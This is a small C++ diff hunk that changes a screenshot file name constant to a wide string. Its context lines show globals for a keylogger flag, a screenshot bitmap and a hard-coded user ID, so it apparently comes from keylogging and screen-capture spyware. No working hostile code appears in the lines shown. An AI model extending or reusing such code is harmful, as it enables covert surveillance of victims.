@@ -2,7 +2,7 @@
 
 const char* filename = "temp.txt";
 const char* cdfilename = "cdtemp.txt";
-const char* scrname = "scr.bmp";
+const std::wstring scrname = L"scr.bmp";
 bool isKeyLoggerRunning = false;
 bool isConversationRunning = false;
 const int64_t sashaId = 1041837892;
